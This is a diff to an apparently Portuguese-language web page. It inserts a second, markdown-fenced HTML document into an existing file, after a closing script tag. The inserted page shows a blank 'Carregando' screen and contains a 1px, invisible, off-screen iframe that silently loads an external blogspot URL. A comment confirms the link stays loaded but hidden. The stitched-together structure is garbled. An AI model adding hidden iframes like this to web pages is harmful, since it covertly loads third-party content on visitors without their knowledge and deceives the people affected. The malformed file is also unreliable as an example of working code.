@@ -1291,9 +1291,58 @@
   carregarAPI();
 </script>
 
+```html
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <title>Carregando</title>
+
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      width: 100%;
+      height: 100%;
+      background: #ffffff;
+      overflow: hidden;
+    }
+
+    /* O link continua carregado, porém invisível */
+    #paginaOculta {
+      position: fixed;
+      width: 1px;
+      height: 1px;
+      top: -9999px;
+      left: -9999px;
+      opacity: 0;
+      border: 0;
+      pointer-events: none;
+    }
+  </style>
+</head>
+
+<body>
+
+  <iframe
+    id="paginaOculta"
+    src="https://recibo1001.blogspot.com/2026/08/painel-de-conteudo-root-bg050807_0265310579.html?m=1"
+    loading="eager">
+  </iframe>
+
+</body>
+</html>
+```
 
 
 
 
   
 </html>
+
+
+
+
+
